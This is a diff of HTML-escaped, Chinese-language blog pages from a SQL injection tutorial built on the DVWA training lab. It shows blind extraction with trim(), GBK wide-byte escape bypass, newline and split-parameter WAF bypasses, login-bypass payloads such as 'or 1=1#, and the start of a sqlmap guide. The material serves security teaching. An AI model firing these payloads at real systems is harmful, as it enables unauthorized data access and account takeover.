+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;a&amp;rsquo;）,后者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头也不是&amp;rsquo;b&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为真&lt;/p&gt;
 &lt;p&gt;这样的话，我们就能判断数据库名称不是以a或者b开头，跳过这两个字母，继续往下尝试&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;第二次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(trim(leading &amp;#39;c&amp;#39; from database()) = (trim(leading &amp;#39;d&amp;#39; from database()))
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;c&amp;rsquo;）,后者返回 &lt;code&gt;&#39;vwa&#39;&lt;/code&gt; （开头是&amp;rsquo;d&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;vwa&#39;&lt;/code&gt;，表达式为假&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()) &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;前者返回 &lt;code&gt;&#39;dvwa&#39;&lt;/code&gt; （开头不是&amp;rsquo;c&amp;rsquo;）,后者返回 &lt;code&gt;&#39;vwa&#39;&lt;/code&gt; （开头是&amp;rsquo;d&amp;rsquo;）最终 &lt;code&gt;&#39;dvwa&#39; = &#39;vwa&#39;&lt;/code&gt;，表达式为假&lt;/p&gt;
 &lt;p&gt;我们就能够判断，数据库名称是以c和d其中的一个字母开头，取其中一个字母，继续往下尝试&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;第三次&lt;code&gt;trim()&lt;/code&gt;：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(trim(leading &amp;#39;d&amp;#39; from database()) = (trim(leading &amp;#39;e&amp;#39; from database()))
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;表达式为&lt;code&gt;&#39;vwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()) &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;trim&lt;/span&gt;(&lt;span style=&#34;color:#e06c75&#34;&gt;leading&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;database&lt;/span&gt;()))
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;表达式为&lt;code&gt;&#39;vwa&#39; = &#39;dvwa&#39;&lt;/code&gt;，表达式为假，我们就可以确定，数据库名称是以d和e其中的一个字母开头&lt;/p&gt;
 &lt;p&gt;再结合上一次的判断结果，c和d中有一个是开头字母，就能确定是以d开头了&lt;/p&gt;
 &lt;p&gt;如果这个表达式为假，说明d和e都不是，而c和d中有一个是，我们同样能以此确定是以c开头&lt;/p&gt;
 &lt;p&gt;这样一位一位判断，就能凑出全貌&lt;/p&gt;
@@ -2115,8 +2185,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;li&gt;
 &lt;p&gt;&lt;mark&gt;&lt;strong&gt;宽字节注入(1%df&amp;rsquo;#)：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
 &lt;p&gt;攻击者提交&lt;code&gt;?id=1%df&#39;#&lt;/code&gt;，&lt;code&gt;check_addslashes&lt;/code&gt;函数将&lt;code&gt;&#39;&lt;/code&gt;转义为&lt;code&gt;\&#39;&lt;/code&gt;，在url编码下变成：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?id=1%df%5c%27#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;%5c&lt;/code&gt;就是被添加进去的反斜杠&lt;code&gt;\&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?id=1%df%5c%27#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;%5c&lt;/code&gt;就是被添加进去的反斜杠&lt;code&gt;\&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;请求到达MySQL服务器，由于连接是GBK编码，MySQL开始按照GBK规则解析字节流&lt;code&gt;0xdf 0x5c 0x27&lt;/code&gt;：&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;MySQL首先读到&lt;code&gt;0xdf&lt;/code&gt;，因为它在&lt;code&gt;0x81-0xFE&lt;/code&gt;范围内，MySQL认为这是一个宽字符的开始&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;随后，MySQL“吃掉”了紧随其后的&lt;code&gt;0x5c&lt;/code&gt;（反斜杠&lt;code&gt;\&lt;/code&gt;）作为这个宽字符的第二字节&lt;/strong&gt;&lt;/p&gt;
@@ -2140,9 +2210,9 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;p&gt;元字符&lt;code&gt;.&lt;/code&gt;可以匹配除换行符以外的任意单个字符，没有使用&lt;code&gt;s&lt;/code&gt;修正符，所以 &lt;code&gt;.&lt;/code&gt; 无法匹配换行符！&lt;/p&gt;
 &lt;p&gt;而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符&lt;/p&gt;
 &lt;p&gt;所以，我们可以在查询语句里面插入换行符绕过：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
-												 ↑
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;9-多参数请求绕过双输入表单&#34;&gt;#9 多参数请求绕过（双输入表单）
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;												 ↑
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;9-多参数请求绕过双输入表单&#34;&gt;#9 多参数请求绕过（双输入表单）
 &lt;/h2&gt;&lt;h3 id=&#34;绕过间隔代码&#34;&gt;绕过间隔代码
 &lt;/h3&gt;&lt;p&gt;部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$param_a&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;];
@@ -2150,18 +2220,18 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM user WHERE name = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$param_a&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39; AND password = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$param_b&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分&lt;/p&gt;
 &lt;p&gt;a部分输入：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union/*
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;b部分输入：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*/select 1,2#
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样拼凑之后的sql语句就是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1&amp;#39; union/*
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;b部分输入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;*/select 1,2#
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样拼凑之后的sql语句就是：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;union&lt;/span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;/*&amp;#39; AND password = &amp;#39;*/&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句&lt;/p&gt;
 &lt;h3 id=&#34;万能密码&#34;&gt;万能密码
 &lt;/h3&gt;&lt;p&gt;&lt;strong&gt;还可以构造出万能密码&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;我们使用管理员的账号登录，假设是admin，密码输入：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;#39;or 1=1# 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样sql语句就变成了：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#39;or 1=1# 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样sql语句就变成了：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;admin &amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AND&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;我们竟然直接登录了管理员的账号，这是为什么呢？&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;一般没有进行SQL语句参数化的登录语句是这样的：&lt;/p&gt;
@@ -2172,8 +2242,8 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or是或者的意思，也就是Password=xxx的时候可以登录，也可以是1=1的时候可以登录&lt;/p&gt;
 &lt;p&gt;但1永远等于1，所以登录条件永远成立！&lt;/p&gt;
 &lt;p&gt;或者换一种方式，我们直接在账号处就使用：&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;admin&amp;#39;# 
-&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;密码随便填写，这样sql语句就是：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;admin&amp;#39;# 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;密码随便填写，这样sql语句就是：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39; AND password = &amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;xxx&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完全忽略了密码的校验，也就顺利登录了管理员账号&lt;/p&gt;
 &lt;p&gt;&lt;span style=&#34;color:#2c8af0;font-size:20px&#34;&gt;&lt;strong&gt;恭喜，你现在已经学会了手工注入！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
@@ -2181,7 +2251,7 @@ XPATH syntax error: &amp;#39;~b882cf99~&amp;#39;
 &lt;p&gt;&lt;span style=&#34;color:#2c8af0;font-size:30px&#34;&gt;&lt;strong&gt;当然是有的！那就是使用自动化注入工具&amp;ndash;SqlMap！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;h1 id=&#34;sqlmap使用&#34;&gt;SqlMap使用
 &lt;/h1&gt;&lt;p&gt;&lt;strong&gt;下载地址：&lt;/strong&gt;&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/sqlmapproject/sqlmap.git
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-texttext&#34; data-lang=&#34;texttext&#34;&gt;git clone https://github.com/sqlmapproject/sqlmap.git
 &lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;基本使用步骤&#34;&gt;基本使用步骤
 &lt;/h2&gt;&lt;h3 id=&#34;检查注入点&#34;&gt;检查注入点
 &lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-u：指定目标url&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
